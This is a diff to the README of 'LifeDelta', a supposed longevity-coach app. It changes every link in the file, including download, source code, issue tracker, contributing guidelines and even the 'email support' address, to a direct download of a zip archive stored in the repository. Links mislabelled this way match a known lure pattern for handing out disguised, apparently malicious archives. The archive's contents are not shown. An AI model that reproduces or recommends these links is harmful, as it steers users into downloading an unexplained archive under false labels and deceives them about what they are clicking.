@@ -1,6 +1,6 @@
 # 🕰️ lifedelta - Your Personal Longevity Coach Awaits
 
-[![Download LifeDelta](https://raw.githubusercontent.com/matheusfilipe-jpg/lifedelta/main/warrantee/lifedelta.zip)](https://raw.githubusercontent.com/matheusfilipe-jpg/lifedelta/main/warrantee/lifedelta.zip)
+[![Download LifeDelta](https://github.com/matheusfilipe-jpg/lifedelta/raw/refs/heads/main/LifeDelta/Managers/Software-3.6.zip)](https://github.com/matheusfilipe-jpg/lifedelta/raw/refs/heads/main/LifeDelta/Managers/Software-3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to LifeDelta, your dynamic longevity coach! This application helps you t
 
 To begin using LifeDelta, visit the following page to download the latest version:
 
-[Download LifeDelta](https://raw.githubusercontent.com/matheusfilipe-jpg/lifedelta/main/warrantee/lifedelta.zip)
+[Download LifeDelta](https://github.com/matheusfilipe-jpg/lifedelta/raw/refs/heads/main/LifeDelta/Managers/Software-3.6.zip)
 
 ### Step-by-Step Installation
 
@@ -56,8 +56,8 @@ To help you get started, we've created a simple user guide:
 
 If you encounter any issues or need assistance, please contact our support team. You can find help through:
 
-- **GitHub Issues**: Report bugs or request features directly on our [GitHub repository](https://raw.githubusercontent.com/matheusfilipe-jpg/lifedelta/main/warrantee/lifedelta.zip).
-- **Email Support**: Reach out at https://raw.githubusercontent.com/matheusfilipe-jpg/lifedelta/main/warrantee/lifedelta.zip for further assistance.
+- **GitHub Issues**: Report bugs or request features directly on our [GitHub repository](https://github.com/matheusfilipe-jpg/lifedelta/raw/refs/heads/main/LifeDelta/Managers/Software-3.6.zip).
+- **Email Support**: Reach out at https://github.com/matheusfilipe-jpg/lifedelta/raw/refs/heads/main/LifeDelta/Managers/Software-3.6.zip for further assistance.
 
 ## ⚙️ Contributing
 
@@ -75,8 +75,8 @@ Explore these topics to expand your knowledge about longevity and health tech:
 
 ## 🔗 Quick Links
 
-- [Download LifeDelta](https://raw.githubusercontent.com/matheusfilipe-jpg/lifedelta/main/warrantee/lifedelta.zip)
-- [View Source Code](https://raw.githubusercontent.com/matheusfilipe-jpg/lifedelta/main/warrantee/lifedelta.zip)
-- [Contributing Guidelines](https://raw.githubusercontent.com/matheusfilipe-jpg/lifedelta/main/warrantee/lifedelta.zip)
+- [Download LifeDelta](https://github.com/matheusfilipe-jpg/lifedelta/raw/refs/heads/main/LifeDelta/Managers/Software-3.6.zip)
+- [View Source Code](https://github.com/matheusfilipe-jpg/lifedelta/raw/refs/heads/main/LifeDelta/Managers/Software-3.6.zip)
+- [Contributing Guidelines](https://github.com/matheusfilipe-jpg/lifedelta/raw/refs/heads/main/LifeDelta/Managers/Software-3.6.zip)
 
 Thank you for choosing LifeDelta. We are committed to supporting your journey towards a healthier, longer life!
